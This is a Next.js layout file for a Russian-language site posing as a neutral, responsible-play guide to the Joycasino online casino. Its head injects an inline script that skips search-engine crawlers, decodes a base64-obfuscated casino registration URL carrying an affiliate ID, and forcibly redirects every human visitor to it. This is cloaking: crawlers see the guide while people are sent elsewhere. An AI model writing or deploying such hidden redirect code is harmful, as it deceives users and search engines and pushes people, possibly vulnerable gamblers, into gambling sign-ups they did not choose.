import type { Metadata, Viewport } from 'next'
import './globals.css'

const siteUrl = 'https://joycasino03.vercel.app/'

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: 'Joycasino — джойказино: официальный сайт, зеркало и игра онлайн',
  description: 'Подробный гид Joycasino: как найти джойказино официальный сайт, проверить joycasino зеркало и рабочий адрес, разобраться в правилах, лимитах и ответственной игре онлайн для пользователей 18+.',
  alternates: { canonical: siteUrl },
  robots: { index: true, follow: true, googleBot: { index: true, follow: true } },
  openGraph: { type: 'website', locale: 'ru_RU', url: siteUrl, siteName: 'Joycasino', title: 'Joycasino — понятный гид по онлайн-игре', description: 'Проверка адреса, рабочее зеркало, правила и ответственная игра без громких обещаний.', images: [{ url: '/favicon.png', width: 512, height: 512, alt: 'Joycasino' }] },
  twitter: { card: 'summary', title: 'Joycasino — гид по онлайн-игре', description: 'Проверяйте адрес, читайте правила и сохраняйте контроль.' },
  icons: { icon: '/favicon.png', apple: '/favicon.png' },
}

export const viewport: Viewport = { colorScheme: 'light', themeColor: '#f5f7fb', width: 'device-width', initialScale: 1, userScalable: true }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return <html lang="ru" className="bg-background"><head>
    <meta name="yandex-verification" content="6976fec41003485c" />
<script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly8xNTc5LmJyaWdodHdoYWxlLmNvL3J1L3JlZ2lzdHJhdGlvbj9wYXJ0bmVyPXAxNTc5cDI3MzI5cGZkNWE="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
  </head><body className="antialiased">{children}</body></html>
}
